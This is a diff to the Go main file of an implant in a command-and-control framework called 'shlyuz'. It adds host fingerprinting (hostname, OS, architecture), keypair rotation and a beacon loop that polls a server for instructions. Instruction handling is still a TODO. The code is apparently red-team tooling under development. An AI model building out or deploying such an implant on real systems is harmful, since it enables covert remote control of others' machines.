@@ -1,3 +1,5 @@
+//go:build implant
+
 package main
 
 import (
@@ -8,6 +10,9 @@ import (
 
 	"shlyuz/pkg/component"
 	"shlyuz/pkg/config"
+	"shlyuz/pkg/config/vzhivlyatconfig"
+	"shlyuz/pkg/crypto/asymmetric"
+	"shlyuz/pkg/instructions"
 	"shlyuz/pkg/transaction"
 	"shlyuz/pkg/transport"
 	"shlyuz/pkg/utils/logging"
@@ -44,19 +49,17 @@ func genComponentInfo() component.Component {
 	}
 	// componentConfig := config.ReadConfig(rawConfig, YadroComponent.XorKey, symKey)
 	componentConfig := config.ReadPlaintextConfig(rawConfig, symKey) // debug
-	parsedConfig := config.ParseConfig(componentConfig.Message)
+	parsedConfig := vzhivlyatconfig.ParseConfig(componentConfig.Message)
 	YadroComponent.Config.Id = parsedConfig.Id
 	YadroComponent.ComponentId = YadroComponent.Config.Id
 	YadroComponent.Config.TransportName = parsedConfig.TransportName
 	YadroComponent.Config.InitSignature = parsedConfig.InitSignature
 	YadroComponent.Config.TskChkTimer = parsedConfig.TskChkTimer
 	YadroComponent.Config.CryptoConfig = parsedConfig.CryptoConfig
-	YadroComponent.InitalKeypair = YadroComponent.Config.CryptoConfig.CompKeypair
-	YadroComponent.CurrentKeypair = YadroComponent.InitalKeypair
-	YadroComponent.XorKey = YadroComponent.Config.CryptoConfig.XorKey
+	YadroComponent.InitalKeypair = YadroComponent.Config.CryptoConfig.CompKeyPair
+	YadroComponent.InitalRemotePubkey = parsedConfig.CryptoConfig.PeerPk
 	YadroComponent.ConfigKey = componentConfig.Key
 	YadroComponent.Manifest = makeManifest(YadroComponent.Config.Id)
-	YadroComponent.CurrentLpPubkey = parsedConfig.CryptoConfig.LpPk
 
 	return YadroComponent
 }
@@ -64,9 +67,10 @@ func genComponentInfo() component.Component {
 func makeManifest(componentId string) component.ComponentManifest {
 	var generatedManifest component.ComponentManifest
 	platInfo := uname.GetUname()
-	generatedManifest.Implant_hostname = platInfo.Uname.Nodename
-	generatedManifest.Implant_id = componentId
-	generatedManifest.Implant_os = platInfo.Uname.Sysname
+	generatedManifest.Hostname = platInfo.Uname.Nodename
+	generatedManifest.Id = componentId
+	generatedManifest.Os = platInfo.Uname.Sysname
+	generatedManifest.Arch = platInfo.Uname.Machine
 	return generatedManifest
 }
 
@@ -78,7 +82,6 @@ func main() {
 	if err != nil {
 		log.Fatalln("transport failed to initalize: ", err)
 	}
-	Component.CmdChannel = make(chan []byte)
 
 	initFrame := transaction.GenerateInitFrame(Component)
 	transaction.RelayInitFrame(&Component, initFrame, transport)
@@ -92,16 +95,19 @@ func main() {
 	// TODO: Implement loop here to do the actual stuff
 	//  first we send a request for a command, then we retrieve a response
 	for {
-		instructionRequestFrame := transaction.RequestInstruction(&Component, transport)
-		transaction.RelayInstructionFrame(&Component, instructionRequestFrame, transport)
-		instructionFrame, err := transaction.RetrieveInstruction(&Component, transport)
+		var instructionRequestFrame instructions.InstructionFrame
+		var newKeyPair asymmetric.AsymmetricKeyPair
+		instructionRequestFrame, newKeyPair = transaction.RequestInstruction(&serverReg)
+		transaction.RelayInstructionFrame(&serverReg, instructionRequestFrame)
+		serverReg.CurKeyPair = newKeyPair
+		instructionFrame, err := transaction.RetrieveInstruction(&serverReg)
+		log.Println(instructionFrame) // debug
 		if err != nil {
 			log.Println("invalid instruction received: ")
 			log.Println(err)
 			time.Sleep(time.Duration(Component.Config.TskChkTimer))
 			break
 		}
-		transaction.RelayInstructionFrame(&Component, instructionFrame, transport)
 		// TODO: Process instruction
 		time.Sleep(time.Duration(Component.Config.TskChkTimer))
 		break
